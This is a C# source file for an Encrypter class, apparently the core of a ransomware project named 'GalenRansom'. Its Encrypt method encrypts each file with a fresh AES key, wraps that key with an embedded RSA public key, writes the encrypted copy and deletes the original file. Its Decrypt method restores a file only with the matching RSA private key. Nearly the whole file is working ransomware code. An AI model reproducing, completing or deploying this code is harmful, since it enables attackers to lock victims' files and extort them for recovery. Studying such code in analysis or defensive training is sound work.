using System;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;

class Encrypter
{
    private RSA key;
    private string keyPath;

    public Encrypter()
    {
        key = RSA.Create();
        keyPath = "/home/galen/GalenRansom/pub_key.pem";
        key.ImportFromPem(File.ReadAllText(keyPath));

    }

    public void Encrypt(string inFile, string outFile)
    {
        using Aes aes = Aes.Create();
        aes.GenerateKey();
        aes.GenerateIV();

        byte[] encryptedAesKey = key.Encrypt(aes.Key, RSAEncryptionPadding.OaepSHA256);
        byte[] encryptedAesIV  = key.Encrypt(aes.IV,  RSAEncryptionPadding.OaepSHA256);


        using FileStream output = new FileStream(outFile, FileMode.Create);

        output.Write(BitConverter.GetBytes(encryptedAesKey.Length)); // 4 bytes = key length
        output.Write(encryptedAesKey);
        output.Write(encryptedAesIV);

        using CryptoStream cs = new CryptoStream(output, aes.CreateEncryptor(), CryptoStreamMode.Write);
        using FileStream input = new FileStream(inFile, FileMode.Open);
        input.CopyTo(cs);
        File.Delete(inFile);
    }

    public void Decrypt(string inputPath, string outputPath, string privateKeyPem)
    {
        RSA rsa = RSA.Create();
        rsa.ImportFromPem(File.ReadAllText(privateKeyPem));

        using FileStream input = new FileStream(inputPath, FileMode.Open);

        // Read the encrypted AES key and IV from the file header
        byte[] keyLenBytes = new byte[4];
        input.Read(keyLenBytes);
        int keyLen = BitConverter.ToInt32(keyLenBytes);

        byte[] encryptedAesKey = new byte[keyLen];
        byte[] encryptedAesIV  = new byte[256]; // RSA 2048 = 256 byte output
        input.Read(encryptedAesKey);
        input.Read(encryptedAesIV);

        // Decrypt AES key and IV with RSA private key
        using Aes aes = Aes.Create();
        aes.Key = rsa.Decrypt(encryptedAesKey, RSAEncryptionPadding.OaepSHA256);
        aes.IV  = rsa.Decrypt(encryptedAesIV,  RSAEncryptionPadding.OaepSHA256);

        // Decrypt file content
        using FileStream output = new FileStream(outputPath, FileMode.Create);
        using CryptoStream cs = new CryptoStream(input, aes.CreateDecryptor(), CryptoStreamMode.Read);
        cs.CopyTo(output);
        File.Delete(inputPath);
    }
    

}